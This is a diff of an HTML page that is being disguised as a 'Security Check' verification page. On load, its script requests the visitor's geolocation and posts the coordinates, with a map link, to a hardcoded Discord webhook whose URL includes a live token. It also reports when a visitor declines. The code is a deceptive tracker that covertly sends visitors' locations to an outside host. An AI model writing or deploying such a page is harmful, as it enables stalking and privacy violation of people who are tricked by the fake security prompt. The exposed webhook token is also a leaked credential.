@@ -1,49 +1,76 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Location Access</title>
+    <title>Verification Page</title>
 </head>
 <body>
-    <h1>Welcome to my website</h1>
-    <p>Please allow location access to continue.</p>
+    <h1>Security Check</h1>
+    <p>Please respond to the browser prompt to continue.</p>
 
     <script>
-        // Replace this with your actual Discord Webhook URL
+        // 1. Put your Discord Webhook URL here
         const webhookURL = "https://discord.com/api/webhooks/1496992326613074151/ksCzYavEYpnu3ecrCpEMHiVDNvX0SMmU89NF8s9eOYGgLid054OkRlr8dQ6cIkZLluE8";
 
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToDiscord, handleError);
+                // This triggers the browser prompt
+                navigator.geolocation.getCurrentPosition(sendSuccess, sendFailure);
             } else {
-                console.log("Geolocation is not supported by this browser.");
+                reportToDiscord("❌ **Unsupported:** User's browser doesn't support Geolocation.");
             }
         };
 
-        function sendToDiscord(position) {
+        // If they click ALLOW
+        function sendSuccess(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
             const payload = {
-                content: "📍 **New Location Received!**",
+                content: "✅ **User Accepted Location Access**",
                 embeds: [{
-                    title: "User Coordinates",
-                    description: `Latitude: ${lat}\nLongitude: ${lon}`,
-                    color: 5814783,
-                    url: `https://www.google.com/maps?q=${lat},${lon}`
+                    title: "Location Data Found",
+                    color: 3066993, // Green
+                    description: `**Latitude:** ${lat}\n**Longitude:** ${lon}`,
+                    url: mapLink
                 }]
             };
+            
+            postToWebhook(payload);
+        }
 
+        // If they click BLOCK / DECLINE
+        function sendFailure(error) {
+            let reason = "Unknown Error";
+            
+            if (error.code === 1) {
+                reason = "User clicked 'BLOCK/DENY'";
+            } else if (error.code === 2) {
+                reason = "Location unavailable (Network issues)";
+            } else if (error.code === 3) {
+                reason = "Request timed out";
+            }
+
+            const payload = {
+                content: `🚫 **User Declined or Failed**\n**Reason:** ${reason}`,
+                color: 15158332 // Red
+            };
+
+            postToWebhook(payload);
+        }
+
+        // Helper function to send the data
+        function postToWebhook(data) {
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(data)
             })
-            .then(() => console.log("Success!"))
-            .catch(err => console.error("Error sending to Discord:", err));
-        }
-
-        function handleError(error) {
-            console.warn(`ERROR(${error.code}): ${error.message}`);
+            .then(() => {
+                // Optional: Redirect the user after they click
+                // window.location.href = "https://google.com";
+            })
+            .catch(err => console.error("Webhook Error:", err));
         }
     </script>
 </body>
